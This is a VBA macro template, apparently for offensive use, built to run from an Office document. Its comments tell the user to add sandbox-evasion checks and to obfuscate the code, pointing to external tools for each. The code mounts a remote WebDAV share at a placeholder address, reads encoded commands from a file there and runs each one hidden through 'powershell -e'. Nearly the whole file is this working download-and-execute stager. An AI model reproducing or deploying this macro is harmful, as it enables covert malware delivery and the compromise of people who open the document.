'-------------------------------------------------------------------------------
' Call this subroutine
'-------------------------------------------------------------------------------
Sub Go()
    Dim cmd As String, srv As String
    Dim res As Integer
      
	'--------------------------------------------------------------
	' Put here some sanbdox evasion tricks, for example:
	' - check for printers
	' - check for last opened documents
	' - make it specific and targeted
	' - Or simply check some of the available techniques here: https://github.com/mgeeky/RobustPentestMacro/blob/master/RobustPentestMacro.vbs
	'--------------------------------------------------------------
	
	'--------------------------------------------------------------
	' Obfuscate the following block with any combination of simple obfuscation tricks:
	' - split and reverse string
	' - use of the chr() function
	' - Or simply use the following tool: https://github.com/mgeeky/VisualBasicObfuscator
	'--------------------------------------------------------------
    srv = "<==== ANY STANDARD WEBDAV SERVER IP OR FQDN ====>"
    
    ' Call the WebDav server and list files, place the result in a temporary file
    cmd = "cmd /c pushd \\" & srv & " & for /f ""usebackq tokens=*"" %a in (`type cmd-psh.txt`) do powershell -e %a & popd"
   
    res = Shell(cmd, vbHide)
    
End Sub
